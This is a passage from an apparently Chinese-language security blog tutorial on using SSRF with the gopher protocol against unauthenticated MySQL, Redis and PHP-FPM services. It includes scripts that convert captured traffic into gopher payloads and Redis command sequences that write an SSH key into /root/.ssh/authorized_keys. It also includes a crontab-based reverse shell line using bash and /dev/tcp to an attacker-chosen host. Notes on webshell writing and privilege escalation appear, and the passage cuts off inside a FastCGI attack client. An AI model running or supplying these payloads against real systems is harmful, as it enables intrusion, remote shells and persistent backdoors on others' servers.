python togopher.py -f &lt;filename&gt;               python togopher.py -s &lt;Byte stream&gt;               python togopher.py -h        &quot;&quot;&quot;        sys.exit()    if len(opts) == 0:        print &quot;Usage: python togopher.py -h&quot;    for opt,value in opts:        if opt in (&quot;-h&quot;, &quot;--help&quot;):            print &quot;&quot;&quot;            Usage:             -h     --help     帮助            -f     --file     数据包文件名            -s     --stream   从流量包中得到的字节流            &quot;&quot;&quot;            sys.exit()        if opt in (&quot;-f&quot;, &quot;--file&quot;):            if not value:                print &quot;Usage: python togopher.py -f &lt;filename&gt;&quot;                sys.exit()            words = &quot;&quot;            with open(value, &quot;r&quot;) as f:                for i in f.readlines():                    for j in i:                        if re.findall(r&#39;\n&#39;, j):                            words += &quot;%0d%0a&quot;                        else:                            temp = str(hex(ord(j)))                            if len(temp) == 3:                                words += &quot;%0&quot; + temp[2]                            else:                                words += &quot;%&quot; + temp[2:]            print words        if opt in (&quot;-s&quot;, &quot;--stream&quot;):            if not value:                print &quot;Usage: python togopher.py -s &lt;Bytg stream&gt;&quot;                sys.exit()            a = [value[i:i+2] for i in xrange(0, len(value), 2)]            words = &quot;%&quot; + &quot;%&quot;.join(a)            print wordsif __name__ == &quot;__main__&quot;:    togopher()</code></pre><h2 id="0x04-利用gopher攻击未授权Mysql"><a href="#0x04-利用gopher攻击未授权Mysql" class="headerlink" title="0x04 利用gopher攻击未授权Mysql"></a>0x04 利用gopher攻击未授权Mysql</h2><h3 id="4-1-MySQL连接方式"><a href="#4-1-MySQL连接方式" class="headerlink" title="4.1 MySQL连接方式"></a>4.1 MySQL连接方式</h3><p>MySQL分为服务端和客户端，客户端连接服务器使存在三种方法：</p><ol><li>Unix套接字；</li><li>内存共享/命名管道；</li><li>TCP/IP套接字；</li></ol><ul><li>在linux或者Unix环境下，当我们输入<code>mysql -uroot -proot</code>登录MySQL服务器时就是用的Unix套接字连接；Unix套接字其实不是一个网络协议，只能在客户端和Mysql服务器在同一台电脑上才可以使用。</li><li>在window系统中客户端和Mysql服务器在同一台电脑上，可以使用命名管道和共享内存的方式。</li><li>P/IP套接字是在任何系统下都可以使用的方式，也是使用最多的连接方式，当我们输入<code>mysql –h 127.0.0.1 –u root –proot</code>时就是要TCP/IP套接字。</li></ul><p><strong>抓取的MySQL通信数据包必须使用TCP/IP套接字连接。</strong></p><h3 id="4-2-MySQL认证过程"><a href="#4-2-MySQL认证过程" class="headerlink" title="4.2 MySQL认证过程"></a>4.2 MySQL认证过程</h3><p>MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。</p><ul><li>当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证</li><li>当无需密码认证时直接发送TCP/IP数据包即可</li></ul><p><strong>所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。</strong></p><p>MySQL客户端与服务器的交互主要分为两个阶段：连接阶段或者叫认证阶段和命令阶段。在连接阶段包括握手包和认证包，这里主要关注认证数据包。</p><p>认证数据包格式如下：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-33b97dd543e0d977.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>以上内容摘抄自smile师傅的文章，非原创<br><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/</a></p><h3 id="4-3-构造攻击数据包"><a href="#4-3-构造攻击数据包" class="headerlink" title="4.3 构造攻击数据包"></a>4.3 构造攻击数据包</h3><p>通过上面MySQL通信协议的分析，现在需要构造一个基于TCP/IP的数据包，包括连接，认证，执行命令，退出等MySQL通信数据。</p><blockquote><p>新建一个只允许本地访问的拥有所有权限的且无密码的用户：<br>CREATE USER ‘test’@’localhost’;<br>GRANT ALL ON <em>.</em> TO ‘test’@’localhost’;</p></blockquote><p>这样我们就有了一个未授权的Mysql数据库，然后开始监听流量<br><code>tcpdump -i lo port 3306 -w mysql.pcapng</code></p><p>在执行我们想要执行的mysql语句；<br>如:</p><pre><code>ues mysql;select * from user;</code></pre><p>然后在wireshark中查看我们抓到包<br>需要注意的是要使用TCP/IP套接字模式连接数据库<br><code>mysql –h 127.0.0.1 –u test</code><br>然后追踪tcp流，从中过滤处传送给3306的转存为原始数据<br><img src="/3983147628/1.png" alt><br>然后转换成gopher格式，附一个网上的脚本</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">def</span> <span class="token function">results</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    a<span class="token operator">=</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">"curl gopher://127.0.0.1:3306/_%"</span><span class="token operator">+</span><span class="token string">"%"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> sys    s<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>results<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/3983147628/2.png" alt><br>然后直接执行，成功获取数据<br><img src="/3983147628/3.png" alt></p><p>这就等于是mysql的RCE，可以执行任何的mysql操作，可以根据权限进行判断</p><ol><li>udf提权实现任意命令执行（需要有插件目录的写入权限）</li><li>通过mysql执行select into outfile，写webshell（绝对路径、对web目录有写权限、且没有配置 –secure-file-priv）<br>secure_file_priv参数若为NULL代表不可导出，若为空则表示可导出⾄任意⽬录下，或者是通过该参数指定mysql的导出⽬录。</li><li>load_file()函数读文件（FILE权限，可读权限）</li><li>……</li></ol><h2 id="0x05-利用gopher攻击未授权Redis"><a href="#0x05-利用gopher攻击未授权Redis" class="headerlink" title="0x05 利用gopher攻击未授权Redis"></a>0x05 利用gopher攻击未授权Redis</h2><p>这个是ssrf最常见的一种了，大致其实与MYSQL是一样的，都是由于未授权导致，可以利用gopher，进行RCE，redis常见的利用方式为下面三种</p><ol><li>ssh_keygen公钥写入，可以说是危害最大的一种攻击方式了</li><li>绝对路径写webshell</li><li>利用contrab计划任务反弹shell</li></ol><h3 id="5-1-Redis数据库简介"><a href="#5-1-Redis数据库简介" class="headerlink" title="5.1 Redis数据库简介"></a>5.1 Redis数据库简介</h3><p>redis是一种key-value键值对的非关系型数据库，默认运行在6379端口，它启动时不会像apache一样，以一种www-data低权限身份运行。而是以运行者的身份，例如用root权限直接运行redis时，redis的权限就是root权限，其次它的默认配置是无需密码的（# requirepass foobared），也就造成了默认的未授权访问，redis还支持本地存储，也就导致了任意文件写入。从而可以写入私钥，利用私钥直接ssh登录服务器。这就是为什么redis是SSRF中最常见的一种方式了。</p><p>另外还需要修改下配置文件（redis.conf），不然默认虽然是无密码，但是会有protected模式，导致无法从外部主机连接，要再bind 127.0.0.1前面加上#号（感觉要是要求是本地，可以不需要这个），并把protected-mode设为no</p><p>常用命令：<br>连接redis</p><blockquote><p>redis-cli -h 192.168.85.132</p></blockquote><p>查看版本信息</p><blockquote><p>192.168.85.132:6379&gt;info</p></blockquote><p>查看键为x的值</p><blockquote><p>192.168.85.132:6379&gt;get x</p></blockquote><p>查看所有键</p><blockquote><p>192.168.85.132:6379&gt;keys *</p></blockquote><p>设置x的值为test</p><blockquote><p>192.168.85.132:6379&gt;set x “test”</p></blockquote><p>删除所有键</p><blockquote><p>192.168.85.132:6379&gt;flushall</p></blockquote><p>设置redis本地存储的文件夹和文件名</p><blockquote><p>192.168.85.132:6379&gt;config set dir /root/.ssh<br>192.168.85.132:6379&gt;config set dbfilename authorized_keys</p></blockquote><h3 id="5-2-Redis协议"><a href="#5-2-Redis协议" class="headerlink" title="5.2 Redis协议"></a>5.2 Redis协议</h3><p>Redis服务器与客户端通过RESP（REdis Serialization Protocol）协议通信。<br>RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。</p><p>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p><p>RESP在Redis中用作请求 - 响应协议的方式如下：</p><ol><li>客户端将命令作为Bulk Strings的RESP数组发送到Redis服务器。</li><li>服务器根据命令实现回复一种RESP类型。</li></ol><p>在RESP中，某些数据的类型取决于第一个字节：</p><ul><li>对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code></li><li>对于<code>error</code>，回复的第一个字节是<code>-</code></li><li>对于<code>Integer</code>，回复的第一个字节是<code>:</code></li><li>对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code></li><li>对于<code>array</code>，回复的第一个字节是<code>*</code></li></ul><p>此外，RESP能够使用稍后指定的Bulk Strings或Array的特殊变体来表示Null值。<br>在RESP中，协议的不同部分始终以”\r\n”(CRLF)结束。</p><p>抓包具体分析看一下<br>redis执行：</p><pre><code>127.0.0.1:6379&gt; set tetst teaOK127.0.0.1:6379&gt; get tetst&quot;tea&quot;127.0.0.1:6379&gt; </code></pre><p>看数据包<br><img src="/3983147628/4.png" alt></p><p>正如前面说的，客户端向将命令作为Bulk Strings的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。应该是按照空格进行划分的，所以是三个数组<code>*3</code>然后就是3个字符长度<code>$3</code>,+ok则是执行成功的意思，然后再就是<code>协议的不同部分始终以&quot;\r\n&quot;(CRLF)结束</code>看hex格式<br><img src="/3983147628/5.png" alt><br>每个命令之间都会有一个<code>0d0a</code>，意思就是<code>\r\n</code>代表结束</p><p>了解完Redis数据库后，攻击利用就很容易理解了</p><h3 id="5-3-利用redis写入ssh-keygen公钥"><a href="#5-3-利用redis写入ssh-keygen公钥" class="headerlink" title="5.3 利用redis写入ssh-keygen公钥"></a>5.3 利用redis写入ssh-keygen公钥</h3><p>原理就是将redis数据库备份到存储公钥的文件中（~/.ssh/authorized_keys）<img src="https://zhuanlan.zhihu.com/p/28423720" alt="SSH 免密登录"><br>具体步骤是：</p><ol><li>在本地生成一对密匙<br><code>ssh-keygen -t rsa</code></li><li>然后将公钥写入到一个文件中<br><code>(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;)&gt;key.txt</code></li><li>再利用redis将文件中的公钥写入redis服务器上的<code>~/.ssh/authorized_keys</code>中</li><li>然后ssh免密登录</li></ol><p>下面直接进行操作<br>创建密匙,并写入文件<br><img src="/3983147628/6.png" alt><br><img src="/3983147628/7.png" alt></p><p>接下来就是利用redis把文件写入到服务器上，这时候我们就需要伪造请求，然后改成gopher格式。<br>先做个端口转发获取redis的请求流量（用ftpdump也可以，但是要一条一条的输入，不然会抓取不到，有点麻烦）</p><pre><code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</code></pre><p>这时候我们请求4444端口就会把流量转发给6379</p><pre><code>//redis.sh    cat /root/.ssh/key.txt|redis-cli -h $1 -p $2 -x set 1 flushallredis-cli -h $1 -p $2 config set dir /root/.ssh/redis-cli -h $1 -p $2 config set dbfilename authorized_keysredis-cli -h $1 -p $2 save   redis-cli -h $1 -p $2 quit</code></pre><p>执行<code>./redis.sh 127.0.0.1 4444</code><br>socat会把流量都打印出来<br><img src="/3983147628/8.png" alt></p><p>需要把数据按照RESP格式处理好，然后转成gopher请求的格式<br>RESP转换规则如下：</p><ul><li>如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。</li><li>如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。</li><li>将\r字符串替换成%0d%0a</li><li>空白行替换为%0a</li></ul><p>直接附上JoyChou师傅的脚本</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding: utf-8</span><span class="token comment" spellcheck="true">#author: JoyChou</span><span class="token keyword">import</span> sysexp <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">with</span> open<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token string">'>&lt;+'</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token comment" spellcheck="true"># 判断倒数第2、3字符串是否为\r</span>        <span class="token keyword">elif</span> line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token string">'\r'</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 如果该行只有\r，将\r替换成%0a%0d%0a</span>            <span class="token keyword">if</span> len<span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>                exp <span class="token operator">=</span> exp <span class="token operator">+</span> <span class="token string">'%0a%0d%0a'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>r<span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'%0d%0a'</span><span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># 去掉最后的换行符</span>                line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>                exp <span class="token operator">=</span> exp <span class="token operator">+</span> line        <span class="token comment" spellcheck="true"># 判断是否是空行，空行替换为%0a</span>        <span class="token keyword">elif</span> line <span class="token operator">==</span> <span class="token string">'\x0a'</span><span class="token punctuation">:</span>            exp <span class="token operator">=</span> exp <span class="token operator">+</span> <span class="token string">'%0a'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            exp <span class="token operator">=</span> exp <span class="token operator">+</span> line<span class="token keyword">print</span> exp</code></pre><p><img src="/3983147628/9.png" alt><br>突然发现有错误，忘记再靶机上创建文件了，必须要保证脚本全部执行成功才能抓取到正确的流量。同时也要保证各个文件的数据都再。踩得坑……<br><img src="/3983147628/10.png" alt><br>现在的payload正常了，然后执行<br><img src="/3983147628/11.png" alt><br><img src="/3983147628/12.png" alt><br>话说最好还是flushall一下，不然有其他乱起八糟的，不知道这样能不能用……</p><h3 id="5-4-利用contrab计划任务反弹shell"><a href="#5-4-利用contrab计划任务反弹shell" class="headerlink" title="5.4 利用contrab计划任务反弹shell"></a>5.4 利用contrab计划任务反弹shell</h3><p>linux⾃带cron服 务，这个服务每隔⼀段时间会⾃动扫描相应的⽂件夹，查看下⾯是否有新增的⽂件，若有则 当作crontab脚本解析。而crontab是linux中的⼀种定时服务。这里主要学习下crontab，感觉可以用来留后门啥的……<br>crontab的文件格式：</p><pre><code>第1列分钟0～59第2列小时0～23（0表示子夜）第3列日1～31第4列月1～12第5列星期0～7（0和7表示星期天）第6列要运行的命令*****[command]--》这个表示每一分钟执行一次命令</code></pre><p>主要看一下ubuntu和centos，ubuntu是不能利用的，原因：</p><ol><li>为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是-rw——-才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</li><li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li></ol><p>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code><br>Centos和Ubuntu均存在的（需要root权限）/etc/crontab ，所以脚本最好都用root用户，若是文件名和系统中的用户都不符合就会报错。<br>PS：高版本的redis默认启动是redis权限，redis权限基本什么都干不了，故写这个文件是行不通的</p><p>具体的下面这篇文章介绍了：<br><img src="https://joychou.org/web/hackredis-enhanced-edition-script.html" alt></p><p>原理都一样，只不过是写入的文件夹不一样。就不演示了，流程一样，只不过要改一下路径，</p><pre><code>//redis.shecho -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/$3/23333 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit</code></pre><h3 id="5-5-利用redis写入webshell"><a href="#5-5-利用redis写入webshell" class="headerlink" title="5.5 利用redis写入webshell"></a>5.5 利用redis写入webshell</h3><p>改脚本和路径可。需要注意的是就是要知道绝对路径，以及要有写权限。同时现在大多站库分离……so……</p><h2 id="0x06-gopher攻击认证Redis"><a href="#0x06-gopher攻击认证Redis" class="headerlink" title="0x06 gopher攻击认证Redis"></a>0x06 gopher攻击认证Redis</h2><p>划重点，大多的攻击都是基于未授权的，很少有认证的攻击。而redis却可以。<br>主要原因如下：</p><blockquote><p>Redis客户端支持管道操作，可以通过单个写入操作发送多个命令，而无需在发出下一个命令之前读取上一个命令的服务器回复。所有的回复都可以在最后阅读</p></blockquote><p>正常应该是这样的一个流程：认证成功然后执行命令。是要一步一步来的，但是redis却可以认证成功在一起执行。或说有点理解不了这种逻辑。这样我们就可以把密码放到payload中，如果密码正确，后面的命令就会被执行。同时也可以进行弱口令爆破<br>redis密码命令<br><code>AUTH passwd</code></p><h2 id="0x07-Gopher攻击PHP-FPM"><a href="#0x07-Gopher攻击PHP-FPM" class="headerlink" title="0x07 Gopher攻击PHP-FPM"></a>0x07 Gopher攻击PHP-FPM</h2><p>直接附上P神的关于Fastcgi协议分析的文章，很详细。<br><img src="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" alt><br>画个图概括一下：<br>浏览器——&gt;服务器中间件——&gt;后端语言<br>第一个<code>——&gt;</code>可以成是HTTP协议，构成了浏览器到服务器中间的桥，而第二座桥就是fastcgi协议<br>再就是PHP-FRM（FastCGI进程管理器）</p><blockquote><p>FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。<br>FPM按照fastcgi的协议将TCP流解析成真正的数据。</p></blockquote><p>P神文章中也有提到PHP-FRM的未授权，PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。但是正常情况下，一般都会和127.0.0.1进行绑定。这就是 ssrf做的了，思路还是那个思路，只不过利用ssrf这个跳板绕过了127.0.0.1的限定。</p><p>直接上脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> base64<span class="token keyword">import</span> random<span class="token keyword">import</span> argparse<span class="token keyword">import</span> sys<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">import</span> urllib<span class="token comment" spellcheck="true"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span>PY2 <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">.</span>major <span class="token operator">==</span> <span class="token number">2</span> <span class="token keyword">else</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">bchr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> PY2<span class="token punctuation">:</span>        <span class="token keyword">return</span> force_bytes<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> bytes<span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">bord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>c<span class="token punctuation">,</span> int<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> c    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> ord<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>s<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_text</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> issubclass<span class="token punctuation">(</span>type<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>s<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> str<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> str<span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">class</span> <span class="token class-name">FastCGIClient</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A Fast-CGI Client for Python"""</span>    <span class="token comment" spellcheck="true"># private</span>    __FCGI_VERSION <span class="token operator">=</span> <span class="token number">1</span>    __FCGI_ROLE_RESPONDER <span class="token operator">=</span> <span class="token number">1</span>    __FCGI_ROLE_AUTHORIZER <span class="token operator">=</span> <span class="token number">2</span>    __FCGI_ROLE_FILTER <span class="token operator">=</span> <span class="token number">3</span>    __FCGI_TYPE_BEGIN <span class="token operator">=</span> <span class="token number">1</span>    __FCGI_TYPE_ABORT <span class="token operator">=</span> <span class="token number">2</span>    __FCGI_TYPE_END <span class="token operator">=</span> <span class="token number">3</span>    __FCGI_TYPE_PARAMS <span class="token operator">=</span> <span class="token number">4</span>    __FCGI_TYPE_STDIN <span class="token operator">=</span> <span class="token number">5</span>    __FCGI_TYPE_STDOUT <span class="token operator">=</span> <span class="token number">6</span>    __FCGI_TYPE_STDERR <span class="token operator">=</span> <span class="token number">7</span>    __FCGI_TYPE_DATA <span class="token operator">=</span> <span class="token number">8</span>    __FCGI_TYPE_GETVALUES <span class="token operator">=</span> <span class="token number">9</span>    __FCGI_TYPE_GETVALUES_RESULT <span class="token operator">=</span> <span class="token number">10</span>    __FCGI_TYPE_UNKOWNTYPE <span class="token operator">=</span> <span class="token number">11</span>    __FCGI_HEADER_SIZE <span class="token operator">=</span> <span class="token number">8</span>    <span class="token comment" spellcheck="true"># request state</span>    FCGI_STATE_SEND <span class="token operator">=</span> <span class="token number">1</span>    FCGI_STATE_ERROR <span class="token operator">=</span> <span class="token number">2</span>    FCGI_STATE_SUCCESS <span class="token operator">=</span> <span class="token number">3</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> timeout<span class="token punctuation">,</span> keepalive<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>host <span class="token operator">=</span> host        self<span class="token punctuation">.</span>port <span class="token operator">=</span> port        self<span class="token punctuation">.</span>timeout <span class="token operator">=</span> timeout        <span class="token keyword">if</span> keepalive<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>keepalive <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>keepalive <span class="token operator">=</span> <span class="token number">0</span>        self<span class="token punctuation">.</span>sock <span class="token operator">=</span> None        self<span class="token punctuation">.</span>requests <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__connect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># if self.keepalive:</span>        <span class="token comment" spellcheck="true">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span>        <span class="token comment" spellcheck="true"># else:</span>        <span class="token comment" spellcheck="true">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span> int<span class="token punctuation">(</span>self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> msg<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>sock <span class="token operator">=</span> None            <span class="token keyword">print</span><span class="token punctuation">(</span>repr<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">__encodeFastCGIRecord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> fcgi_type<span class="token punctuation">,</span> content<span class="token punctuation">,</span> requestid<span class="token punctuation">)</span><span class="token punctuation">:</span>        length <span class="token operator">=</span> len<span class="token punctuation">(</span>content<span class="token punctuation">)</span>        buf <span class="token operator">=</span> bchr<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_VERSION<span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>fcgi_type<span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>requestid <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>requestid <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>length <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>length <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> content        <span class="token keyword">return</span> buf    <span class="token keyword">def</span> <span class="token function">__encodeNameValueParams</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        nLen <span class="token operator">=</span> len<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        